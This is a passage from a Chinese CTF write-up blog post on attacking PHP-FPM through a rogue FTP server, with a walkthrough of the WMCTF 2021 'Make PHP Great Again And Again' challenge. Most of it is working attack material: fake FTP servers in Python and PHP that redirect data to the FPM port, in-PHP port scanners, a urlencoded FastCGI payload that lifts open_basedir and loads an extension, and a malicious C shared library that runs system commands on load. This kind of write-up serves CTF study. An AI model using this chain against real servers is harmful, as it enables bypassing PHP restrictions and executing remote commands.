+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png alt=image-20211112230401822></p>
+<p>可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发</p>
+<p>不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令</p>
+<p>将上面的ftp-server修改一下，将229响应设为了000</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>socket</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[+] listening ...........&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>socket</span><span style=color:#111>(</span><span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>AF_INET</span><span style=color:#111>,</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>SOCK_STREAM</span><span style=color:#111>)</span>
+<span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>bind</span><span style=color:#111>((</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>9999</span><span style=color:#111>))</span>
+<span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#111>,</span> <span style=color:#111>addr</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>accept</span><span style=color:#111>()</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;220 (vsFTPd 3.0.3)</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;331 Please specify the password.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;230 Login successful.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;200 Switching to Binary mode.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#34;550 Could not get file size.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#75715e># responese with 000 , not 229</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;000 use PASV then</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#75715e># then php will send PASV command</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#75715e># response to PASV command</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;227 Entering Passive Mode (127,0,0,1,0,12345).</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;150 Ok to send data.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#75715e># sending payload .....</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;226 Transfer complete.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>))</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;221 Goodbye.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[+] completed ~~&#34;</span><span style=color:#111>)</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png alt=image-20211112234038671></p>
+<p>成功转发</p>
+<h4 id=使用ftp将payload打向fpm>使用ftp://将payload打向fpm</h4>
+<p>结合上面几个实例应该就很清晰了，思路就是：</p>
+<ul>
+<li>编写包含执行系统命令的恶意.so</li>
+<li>打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(&lsquo;ftp://xxx&rsquo;,$payload)</li>
+<li>用file_put_contents('/tmp/wuhu.so',$_POST[&lsquo;data&rsquo;])的形式将.so传入</li>
+<li>如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了</li>
+</ul>
+<p>这里的完美栗子就是赵总的三句话（指路赵总博客-><a href=https://www.zhaoj.in/read-6951.html>WMCTF2021-Web-Make PHP Great Again And Again WriteUp</a></p>
+<h3 id=攻击unix-socket模式下的php-fpm>***攻击unix socket模式下的php-fpm</h3>
+<h2 id=在题目中的表现>在题目中的表现</h2>
+<h3 id=wmctf-2021make-php-great-again-and-again>[WMCTF 2021]Make PHP Great Again And Again</h3>
+<p>思路先放在前面：找到fpm端口->搭建恶意ftp_server 将.so文件转发至fpm端口->利用.so文件执行命令->拿flag</p>
+<p>题目代码只有三句话</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#75af00>highlight_file</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#f92672>@</span><span style=color:#00a8c8>eval</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;glzjin&#39;</span><span style=color:#111>]);</span>
+</code></pre></div><p>直接看phpinfo();会500，用<code>get_cfg_var</code>获取配置项</p>
+<pre tabindex=0><code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
+</code></pre><pre tabindex=0><code>string(657) &quot;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&quot;
+</code></pre><p>只能说该禁的都禁了；再康康allow_url_fopen和include</p>
+<pre tabindex=0><code>string(1) &quot;1&quot;
+string(0) &quot;&quot;
+</code></pre><p>再康康open_basedir</p>
+<pre tabindex=0><code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
+</code></pre><pre tabindex=0><code>string(14) &quot;/var/www/html/&quot;
+</code></pre><p>emmmmmmmmm 这个之后也需要绕过</p>
+<p>用tcp://伪协议扫一下本机开放的端口</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>for</span><span style=color:#111>(</span><span style=color:#111>$i</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span><span style=color:#111>;</span><span style=color:#111>$i</span><span style=color:#f92672>&lt;</span><span style=color:#ae81ff>65535</span><span style=color:#111>;</span><span style=color:#111>$i</span><span style=color:#f92672>++</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+  <span style=color:#111>$t</span><span style=color:#f92672>=</span><span style=color:#75af00>stream_socket_server</span><span style=color:#111>(</span><span style=color:#d88200>&#34;tcp://0.0.0.0:&#34;</span><span style=color:#f92672>.</span><span style=color:#111>$i</span><span style=color:#111>,</span><span style=color:#111>$ee</span><span style=color:#111>,</span><span style=color:#111>$ee2</span><span style=color:#111>);</span>
+  <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#111>$ee2</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#34;Address already in use&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#111>$i</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>或者<code>file_get_contents</code>和<code>error_get_last</code>获取到请求中发出的错误进行循环判断也可以进行端口扫描</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#00a8c8>for</span><span style=color:#111>(</span><span style=color:#111>$i</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span><span style=color:#111>;</span><span style=color:#111>$i</span><span style=color:#f92672>&lt;</span><span style=color:#ae81ff>65535</span><span style=color:#111>;</span><span style=color:#111>$i</span><span style=color:#f92672>++</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+  <span style=color:#111>$t</span><span style=color:#f92672>=</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://127.0.0.1:&#39;</span><span style=color:#f92672>.</span><span style=color:#111>$i</span><span style=color:#111>);</span>
+  <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>strpos</span><span style=color:#111>(</span><span style=color:#75af00>error_get_last</span><span style=color:#111>()[</span><span style=color:#d88200>&#39;message&#39;</span><span style=color:#111>],</span> <span style=color:#d88200>&#34;Connection refused&#34;</span><span style=color:#111>))</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#111>$i</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><pre tabindex=0><code>int(11451) int(37114) int(48748)
+</code></pre><p>找到了fpm端口11451</p>
+<p>之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#111>$socket</span> <span style=color:#f92672>=</span> <span style=color:#75af00>stream_socket_server</span><span style=color:#111>(</span><span style=color:#d88200>&#34;tcp://0.0.0.0:46819&#34;</span><span style=color:#111>,</span> <span style=color:#111>$errno</span><span style=color:#111>,</span> <span style=color:#111>$errstr</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#111>$socket</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#34;</span><span style=color:#d88200>$errstr</span><span style=color:#d88200> (</span><span style=color:#d88200>$errno</span><span style=color:#d88200>)&lt;br /&gt;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>;</span>
+<span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>while</span> <span style=color:#111>(</span><span style=color:#111>$conn</span> <span style=color:#f92672>=</span> <span style=color:#75af00>stream_socket_accept</span><span style=color:#111>(</span><span style=color:#111>$socket</span><span style=color:#111>))</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;210 Fake FTP</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// USER
+</span><span style=color:#75715e></span>    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;230 Login successful</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// TYPE
+</span><span style=color:#75715e></span>    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;200 xx</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// SIZE
+</span><span style=color:#75715e></span>    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;550 xx</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// EPSV
+</span><span style=color:#75715e></span>    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;500 wtf</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// PASV
+</span><span style=color:#75715e></span>
+    <span style=color:#75715e>// $ip = &#39;192.168.1.4&#39;;
+</span><span style=color:#75715e></span>    <span style=color:#111>$ip</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;127.0.0.1&#39;</span><span style=color:#111>;</span>
+    <span style=color:#111>$port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>11451</span><span style=color:#111>;</span>
+    <span style=color:#111>$porth</span> <span style=color:#f92672>=</span> <span style=color:#75af00>floor</span><span style=color:#111>(</span><span style=color:#111>$port</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>256</span><span style=color:#111>);</span>
+    <span style=color:#111>$portl</span> <span style=color:#f92672>=</span> <span style=color:#111>$port</span> <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span><span style=color:#111>;</span>
+    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;227 Entering Passive Mode. &#34;</span><span style=color:#f92672>.</span><span style=color:#75af00>str_replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;.&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;,&#39;</span><span style=color:#111>,</span><span style=color:#111>$ip</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;,</span><span style=color:#d88200>$porth</span><span style=color:#d88200>,</span><span style=color:#d88200>$portl\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$line</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fgets</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+    <span style=color:#00a8c8>echo</span> <span style=color:#111>$line</span><span style=color:#111>;</span> <span style=color:#75715e>// STOR
+</span><span style=color:#75715e></span>
+    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;125 GOGOGO!</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#75af00>sleep</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>);</span>
+    <span style=color:#75af00>fwrite</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;226 Thanks!</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>);</span>
+    <span style=color:#75af00>fclose</span><span style=color:#111>(</span><span style=color:#111>$conn</span><span style=color:#111>);</span>
+  <span style=color:#111>}</span>
+  <span style=color:#75af00>fclose</span><span style=color:#111>(</span><span style=color:#111>$socket</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#960050;background-color:#1e0010>&#39;PHP_ADMIN_VALUE&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;allow_url_include</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>On\nopen_basedir</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>/\nextension</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>/tmp/wuhu.so&#39;,</span>
+</code></pre></div><p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png alt=image-20211113011624783></p>
+<p>注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python fpm.py 127.0.0.1 <span style=color:#d88200>&#39;/var/www/html/index.php&#39;</span>
+%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
+</code></pre></div><pre tabindex=0><code>/?glzjin=eval($_POST[%27a%27]);
+POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload));
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png alt=image-20211114223615660></p>
+<p>写恶意.so</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#define _GNU_SOURCE
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#111>__attribute__</span> <span style=color:#111>((</span><span style=color:#111>__constructor__</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>preload</span> <span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span>
+<span style=color:#111>{</span>
+    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ls / -al &gt; /tmp/p1.txt&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;find / -perm -4000 2&gt;/tmp/p2.txt&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;cat /flag &gt; /tmp/p3.txt&#34;</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc wuhu.c -o wuhu.so --shared -fPIC
+</code></pre></div><p>传.so</p>
+<pre tabindex=0><code>/?glzjin=eval($_POST[%27a%27]);
+POST:
+a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;data=xxxxxxxxxxxxxxxxxxx
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png alt=image-20211114224351897></p>
+<p>试着执行一下命令，成功解除open_basedir的限制</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png alt=image-20211114231135348></p>
+<p>但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊</p>
+<p>正常来说，只有open_basedir被解放后才可以scandir('/')（没有的话是只可以scandir('/var/www/html')），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir('/')都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行</p>
+<p>之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png alt=image-20211115014616324></p>
+<p>不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了</p>
+<h3 id=蓝帽杯-2021one-pointer-php>***[蓝帽杯 2021]One Pointer PHP</h3>
+<hr>
+<p>现在是凌晨1点50分，赵总的题没能成功打出来真的很难受，很难受，很难受，我人裂开，说好的今天必定搞完，但是现在还差3个小标题和2个题没有复现</p>
+<p>先把半成品放上来吧，这周内必定收尾！</p>
+<hr>
+<details>
+<summary>
+<h4 class=inline>
+以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
+</h4>
+</summary>
+<p><a href=https://blog.csdn.net/shreck66/article/details/50355729>fastcgi协议分析与实例</a></p>
+<p><a href=https://www.kancloud.cn/digest/php-src/136260>php-fpm 与 Nginx优化总结</a></p>
+<p><a href=https://xz.aliyun.com/t/5598>浅析php-fpm的攻击方式</a></p>
+<p><a href=https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html>Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写</a></p>
+<p><a href=https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA>【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions</a></p>
+</details>
+</div>
+</section>
+</article>
+</main>
+<div class="w-full h-0 flex-none order-3"></div>
+<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+<div class="md:max-w-xs flex flex-col md:items-end">
+<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<li class="px-1 md:px-0">
+<a href=/posts/ title="Posts page">
+Posts
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/relax/ title="Relaxxx page">
+Relaxxx
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/categories/ title="Categories page">
+Categories
+</a>
+</li>
